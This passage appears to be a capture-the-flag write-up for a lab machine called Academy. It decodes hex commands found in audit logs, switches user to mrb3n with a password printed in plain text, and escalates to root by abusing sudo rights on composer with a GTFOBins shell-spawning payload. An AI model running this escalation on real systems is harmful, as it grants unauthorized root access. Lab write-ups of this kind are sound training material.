Looking through the audit-logs, I noticed that `audit.log.3` contains a lot of `cmd=<HEX-DATA?>`. 

```bash
cry0l1t3@academy:/var/log/audit$ cat audit.log.3 | grep cmd=
[...]
type=USER_CMD msg=audit(1597270864.489:242): pid=2867 uid=1001 auid=1002 ses=12 msg='cwd="/dev/shm" cmd=2F7573722F62696E2F636F6D706F73657220657865632062617368 terminal=pts/0 res=success'
[...]
audit.log:type=USER_CMD msg=audit(1604842758.155:1343): pid=30747 uid=1001 auid=1002 ses=1 msg='cwd="/tmp" cmd=636F6D706F736572202D2D776F726B696E672D6469723D2F746D702F746D702E7430675677397359766A2072756E2D7363726970742078 terminal=pts/1 res=success'
[...]
```

Let us decode some of the hex strings:

```bash
root@darkness:~# echo -n 2F7573722F62696E2F636F6D706F73657220657865632062617368 | xxd -r -p
/usr/bin/composer exec bash
root@darkness:~# echo -n 636F6D706F736572202D2D776F726B696E672D6469723D2F746D702F746D702E7430675677397359766A2072756E2D7363726970742078 | xxd -r -p
composer --working-dir=/tmp/tmp.t0gVw9sYvj run-script x
```

Seems like the user with the id `1001` is trying to execute bash using composer...

```bash
cry0l1t3@academy:/var/log/audit$ cat /etc/passwd | grep :1001:
mrb3n:x:1001:1001::/home/mrb3n:/bin/sh
```

The user-id 1001 translates to the user `mrb3n`, which we have access to. Let us enumerate and see if this is a privesc-vector.

### Enumeration as mrb3n

Using the credentials, we can su to mrb3n.

```bash
cry0l1t3@academy:/var/log/audit$ su mrb3n
Password: mrb3n_Ac@d3my!
$ bash
mrb3n@academy:/var/log/audit$
```

Let us see, if we can run sudo as `mrb3n`.

```bash
mrb3n@academy:~$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

Seems like we are able to run composer as any user! This is definitely our privesc-vector!

### Exploiting sudo-privileges

Looking at [gtfobins](https://gtfobins.github.io/gtfobins/composer/#sudo), we can find that exploiting our sudo-privileges is rather easy. We can simply copy the commands from [gtfobins](https://gtfobins.github.io/gtfobins/composer/#sudo) and execute it as mrb3n.

```bash
mrb3n@academy:~$ TF=$(mktemp -d)
mrb3n@academy:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
mrb3n@academy:~$ sudo composer --working-dir=$TF run-script x
PHP Warning: [...]
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# id
uid=0(root) gid=0(root) groups=0(root)
```

We successfully get a shell as root and can read root.txt.

```bash
# cat /root/root.txt 
33863***************************
```